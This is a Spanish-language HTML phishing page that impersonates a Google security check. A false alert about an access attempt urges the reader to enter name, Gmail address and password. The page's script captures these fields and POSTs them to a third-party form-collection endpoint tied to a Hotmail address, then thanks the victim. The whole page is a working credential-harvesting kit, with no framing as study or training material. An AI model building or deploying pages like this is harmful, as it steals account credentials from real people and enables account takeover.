<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad de Google</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
            text-align: left;
            width: 100%;
            max-width: 400px;
        }
        .container h1 {
            color: #333;
        }
        .container p {
            color: #666;
        }
        .container form {
            margin-top: 20px;
        }
        .container label, .container input {
            display: block;
            width: 100%;
            margin: 10px 0;
        }
        .container input[type="submit"] {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 4px;
            cursor: pointer;
        }
        .container input[type="submit"]:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verificación de Seguridad de Google</h1>
        <p>Alguien intentó acceder a tu cuenta de Google. Por favor, abre tu cuenta aquí para verificar quién quiso acceder.</p>
        <form id="dataForm">
            <label for="name">Nombre Completo:</label>
            <input type="text" id="name" name="name" required>

            <label for="date">Fecha:</label>
            <input type="date" id="date" name="date" required>

            <label for="email">Correo Electrónico (Gmail):</label>
            <input type="email" id="email" name="email" required>

            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required>

            <input type="submit" value="Verificar">
        </form>
    </div>
    <script>
        document.getElementById('dataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });
            fetch('https://formspree.io/xoasa@hotmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                alert('Datos enviados con éxito. ¡Gracias!');
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
